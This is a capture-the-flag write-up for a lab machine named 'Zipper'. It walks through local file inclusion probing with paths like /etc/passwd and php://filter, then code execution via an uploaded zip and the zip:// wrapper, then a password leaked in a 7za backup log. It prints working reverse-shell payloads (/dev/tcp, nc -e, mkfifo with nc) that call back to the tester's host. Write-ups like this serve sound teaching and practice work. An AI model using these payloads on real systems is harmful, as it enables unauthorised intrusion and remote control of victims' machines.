---
description: Community Rating:Very hard
---

# Zipper

So we start off with a scan:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This is the webpage:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

what i'm interested in is the possible LFI withe file=home parameter so i try reading important stuff ->

```
http://192.168.56.229/index.php?file=home
http://192.168.56.229/index.php?file=../../../../etc/passwd
http://192.168.56.229/index.php?file=../../../../var/log/apache2/access.log
http://192.168.56.229/index.php?file=../../../../etc/php.ini
http://192.168.56.229/index.php?file=../../../../etc/hosts
http://192.168.56.229/index.php?file=../../../../.htaccess
http://192.168.56.229/index.php?file=../../../../etc/ssh/sshd_config
http://192.168.56.229/index.php?file=../../../../var/log/php_errors.log
http://192.168.56.229/index.php?file=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

and the last payload gives me out something:

```
http://192.168.56.229/index.php?file=php://filter/convert.base64-encode/resource=home
```

output on the screen:

```
cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgdmFsdWU9IlVwbG9hZCI+CgkJCQkJCTwvZGl2PgoJCQkJCQk8ZGl2IGNsYXNzPSJjdXN0b20tZmlsZSI+CgkJCQkJCSAgICA8aW5wdXQgdHlwZT0iZmlsZSIgY2xhc3M9ImN1c3RvbS1maWxlLWlucHV0IiBuYW1lPSJpbWdbXSIgbXVsdGlwbGU+CgkJCQkJCSAgICA8bGFiZWwgY2xhc3M9ImN1c3RvbS1maWxlLWxhYmVsIiA+Q2hvb3NlIEZpbGU8L2xhYmVsPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZm9ybT4KCQkJCQogICAgCQk8L2Rpdj4KCQk8L2Rpdj4KICA8L2Rpdj4KCgo8L2Rpdj4KCjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgPGZvb3Rlcj4KICAgIDxwPiZjb3B5OyBaaXBwZXIgMjAyMTwvcD4KICA8L2Zvb3Rlcj4KPC9kaXY+IDwhLS0gLy5jb250YWluZXIgLS0+CjwhLS0gcGFydGlhbCAtLT4KICA8c2NyaXB0IHNyYz0naHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvcG9wcGVyLmpzLzEuMTMuMC91bWQvcG9wcGVyLm1pbi5qcyc+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy90d2l0dGVyLWJvb3RzdHJhcC80LjAuMC1iZXRhLjIvanMvYm9vdHN0cmFwLmJ1bmRsZS5taW4uanMnPjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4K
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So the funny thing os a did not even specify a php file and it still outputed something so that must mean the backend appends .php to my filename home -> home.php / index -> index.php etc

```
view-source:http://192.168.56.229/index.php?file=php://filter/convert.base64-encode/resource=index
```

lol ok that was it:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I tried uploadingg something just for fun earlier and saw this:

&#x20;

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

so i tried reading the content of the upload function:

```
#notworking -> http://192.168.56.229/index.php?file=php://filter/convert.base64-encode/resource=uploads
#working -> http://192.168.56.229/index.php?file=php://filter/convert.base64-encode/resource=upload
```

so uploads file does not exist but upload.php exists:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Here are the key points that make this code bad:

* **Insecure File Upload**: No validation of file types or extensions; an attacker can upload any file, including potentially harmful ones like PHP scripts.
* **Zip Poisoning**: Files (including malicious ones) are added to a ZIP archive without checking content, risking extraction and execution of malicious files.
* **Directory Traversal**: File names are not sanitized, potentially allowing directory traversal attacks (e.g., `../../etc/passwd`).
* **Error Handling**: Errors and success messages are not displayed to the user, making debugging or feedback difficult.
* **No File Size Check**: No limit on file size, potentially leading to issues with large file uploads.
* **Weak File Naming**: Randomly generated filenames (with `.tmp` extension) are misleading and don’t prevent script execution.
* **No Authentication**: No check for authorized users uploading files, allowing anyone to upload content.

So now i need to create a malicious zip file that will give me some sort of foothold, while looking at techniques i find one on the best website ever:

{% embed url="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams" %}

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i create a zip file:

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

hahahahahhaha letsgooooo:

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I got stuck here since i forgot that .php was appended so i tried stuff like:

```
curl "http://192.168.56.229/index.php?file=zip://uploads/upload_1739301135.zip%23payload.php&cmd=id"
curl "http://192.168.56.229/index.php?file=zip://uploads/upload_1739301135.zip%23&cmd=id"
...
```

So now i tried injecting some revshells after enumerating a bit:

```
sh%20-i%20%3E&%20/dev/tcp/192.168.49.56/1234%200%3E&1
nc%20192.168.49.56%201234%20-e%20sh
```

and i obtain a reverse shell juste like that:

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
curl 'http://192.168.56.229/index.php?file=zip://uploads/upload_1739301135.zip%23payload&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|sh%20-i%202>%261|nc%20192.168.49.56%201234%20>/tmp/f'
```

After enumerating for a bit i quickly find a backup file in /opt

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

so i start looking at every file mentionned in this file and end up looking at:

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

this felt a bit wierd so i tried it as a password and got a shell lol

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and after looking why this happens i got my explanation:

* Some versions of `7za` print the full command execution details, including the `-p$password` option, into the log file.
* If `/opt/backups/backup.log` is world-readable, any user can retrieve the password from there.
